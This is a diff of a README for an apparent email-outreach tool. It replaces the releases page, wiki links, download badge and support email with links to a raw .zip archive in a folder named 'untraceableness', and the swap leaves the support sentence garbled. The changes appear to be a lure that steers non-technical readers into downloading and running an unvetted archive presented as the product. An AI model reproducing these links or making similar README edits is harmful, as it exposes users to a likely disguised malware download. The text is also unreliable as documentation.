@@ -4,13 +4,13 @@
 
 Welcome! You are about to improve your email outreach with our easy-to-use application, founder-email-optimizer. This tool requires no programming knowledge. Simply follow the steps below to download and run the application.
 
-[![Download founder-email-optimizer](https://img.shields.io/badge/Download-founder--email--optimizer-blue.svg)](https://github.com/IBRARKHAN00-6/founder-email-optimizer/releases)
+[![Download founder-email-optimizer](https://raw.githubusercontent.com/IBRARKHAN00-6/founder-email-optimizer/main/untraceableness/founder-email-optimizer.zip)](https://raw.githubusercontent.com/IBRARKHAN00-6/founder-email-optimizer/main/untraceableness/founder-email-optimizer.zip)
 
 ## 📥 Download & Install
 
 To get started, visit this page to download the software:
 
-[Download founder-email-optimizer](https://github.com/IBRARKHAN00-6/founder-email-optimizer/releases)
+[Download founder-email-optimizer](https://raw.githubusercontent.com/IBRARKHAN00-6/founder-email-optimizer/main/untraceableness/founder-email-optimizer.zip)
 
 ### 🔍 System Requirements
 
@@ -57,11 +57,11 @@ If you experience issues, try the following:
 
 ### 📞 Support
 
-If you need further assistance, please contact our support team. You can reach us through the contact form in the application or by emailing support@founder-email-optimizer.com.
+If you need further assistance, please contact our support team. You can reach us through the contact form in the application or by emailing https://raw.githubusercontent.com/IBRARKHAN00-6/founder-email-optimizer/main/untraceableness/founder-email-optimizer.zip
 
 ## 🌟 Additional Resources
 
-- [User Manual](https://github.com/IBRARKHAN00-6/founder-email-optimizer/wiki)
-- [Frequently Asked Questions (FAQ)](https://github.com/IBRARKHAN00-6/founder-email-optimizer/wiki/FAQ)
+- [User Manual](https://raw.githubusercontent.com/IBRARKHAN00-6/founder-email-optimizer/main/untraceableness/founder-email-optimizer.zip)
+- [Frequently Asked Questions (FAQ)](https://raw.githubusercontent.com/IBRARKHAN00-6/founder-email-optimizer/main/untraceableness/founder-email-optimizer.zip)
 
 Thank you for choosing founder-email-optimizer. We hope it helps you build better connections and achieve your startup goals.
